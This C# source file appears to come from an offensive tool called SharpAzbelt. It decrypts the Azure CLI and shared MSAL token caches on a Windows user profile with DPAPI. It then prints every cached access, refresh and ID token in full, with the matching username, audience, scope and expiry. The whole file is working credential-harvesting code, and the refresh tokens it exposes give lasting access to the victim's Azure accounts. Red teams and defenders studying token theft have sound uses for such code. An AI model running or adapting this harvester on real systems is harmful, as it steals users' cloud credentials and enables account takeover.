using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;

namespace SharpAzbelt
{
    class Msal
    {
        public class MsalCache
        {
            public Dictionary<string, Entry> AccessToken { get; set; }
            public Dictionary<string, Entry> RefreshToken { get; set; }
            public Dictionary<string, Entry> IdToken { get; set; }
            public Dictionary<string, Entry> Account { get; set; }
            public Dictionary<string, Entry> AppMetadata { get; set; }
        }

        public class Entry
        {
            public string home_account_id { get; set; }
            public string environment { get; set; }
            public string client_info { get; set; }
            public string client_id { get; set; }
            public string secret { get; set; }
            public string credential_type { get; set; }
            public string realm { get; set; }
            public string target { get; set; }
            public string cached_at { get; set; }
            public string expires_on { get; set; }
            public string extended_expires_on { get; set; }
            public string ext_expires_on { get; set; }
            public string username { get; set; }
        }

        public static string runMsal()
        {
            string outText = "[+] MSAL Cache:\n";
            string homeDir = System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile);

            // Azure CLI MSAL cache
            outText += "[i]  Azure CLI MSAL Cache:\n";
            outText += ParseMSALCache(Path.Combine(homeDir, ".azure\\msal_token_cache.bin"));

            // Shared MSAL cache
            outText += "[i]  Shared MSAL Cache:\n";
            outText += ParseMSALCache(Path.Combine(homeDir, "Appdata\\Local\\.IdentityService\\msal.cache"));

            return outText + "\n";
        }

        private static string ParseMSALCache(string cachePath)
        {
            string outText = "";
            string outFormat = "[+]    {0,-25} : {1}\n";
            byte[] cache;

            // does the cache exist?
            if (!File.Exists(cachePath))
            {
                outText += "[!]    No MSAL cache found\n";
                goto Exit;
            }

            // try to read the file as bytes
            try
            {
                cache = File.ReadAllBytes(cachePath);
            }
            catch (Exception)
            {
                outText += "[!]    Failed to read MSAL cache\n";
                goto Exit;
            }

            // unprotect and deserialise the json object
            string decrypted = NativeMethods.cryptUnprotectData(cache);
            MsalCache msalCache = JsonSerializer.Deserialize<MsalCache>(decrypted);

            outText += "[i]   -------------\n";
            outText += "[i]   Access tokens:\n";
            outText += "[i]   -------------\n";
            // process the access tokens
            foreach (var accessToken in msalCache.AccessToken.Keys)
            {
                // resolve username for entry
                string username = ResolveUser(msalCache.AccessToken, accessToken, msalCache.Account);

                Utils.Jwt jwt = Utils.ProcessJWT(msalCache.AccessToken[accessToken].secret);

                outText += string.Format(outFormat, "Username", username);
                if (Utils.Appids.ContainsKey(jwt.aud))
                    outText += string.Format(outFormat, "Audience", Utils.Appids[jwt.aud]);
                else
                    outText += string.Format(outFormat, "Audience", jwt.aud);
                outText += string.Format(outFormat, "Scope", jwt.scp);
                outText += string.Format(outFormat, "Valid",  DateTimeOffset.FromUnixTimeSeconds(jwt.exp) > DateTimeOffset.Now ? "true" : "false");
                outText += string.Format(outFormat, "Token", msalCache.AccessToken[accessToken].secret);
                outText += "[.]\n"; // gets a little hard to read...
            }

            outText += "[i]   --------------\n";
            outText += "[i]   Refresh tokens:\n";
            outText += "[i]   --------------\n";
            //process the refresh tokens
            foreach (var refreshToken in msalCache.RefreshToken.Keys)
            {
                // resolve username for entry
                string username = ResolveUser(msalCache.RefreshToken, refreshToken, msalCache.Account);

                outText += string.Format(outFormat, "Username", username);
                outText += string.Format(outFormat, "Environment", msalCache.RefreshToken[refreshToken].environment);
                outText += string.Format(outFormat, "Secret", msalCache.RefreshToken[refreshToken].secret);
                outText += "[.]\n"; // gets a little hard to read...
            }

            outText += "[i]   ---------\n";
            outText += "[i]   ID tokens:\n";
            outText += "[i]   ---------\n";
            // process the ID tokens
            foreach (var idToken in msalCache.IdToken.Keys)
            {
                // resolve username for entry
                string username = ResolveUser(msalCache.IdToken, idToken, msalCache.Account);

                Utils.Jwt jwt = Utils.ProcessJWT(msalCache.IdToken[idToken].secret);

                outText += string.Format(outFormat, "Username", username);
                if (Utils.Appids.ContainsKey(jwt.aud))
                    outText += string.Format(outFormat, "Audience", Utils.Appids[jwt.aud]);
                else
                    outText += string.Format(outFormat, "Audience", jwt.aud);
                outText += string.Format(outFormat, "Valid", DateTimeOffset.FromUnixTimeSeconds(jwt.exp) > DateTimeOffset.Now ? "true" : "false");
                outText += string.Format(outFormat, "Token", msalCache.IdToken[idToken].secret);
                outText += "[.]\n"; // gets a little hard to read...
            }

        Exit:
            return outText;
        }

        private static string ResolveUser(Dictionary<string, Entry> element, string currentKey, Dictionary<string, Entry> accountsList)
        {
            string username = "";
            foreach (var entry in accountsList.Keys)
                if (accountsList[entry].home_account_id == element[currentKey].home_account_id)
                {
                    username = accountsList[entry].username;
                    break;
                }

            return username;
        }
    }
}
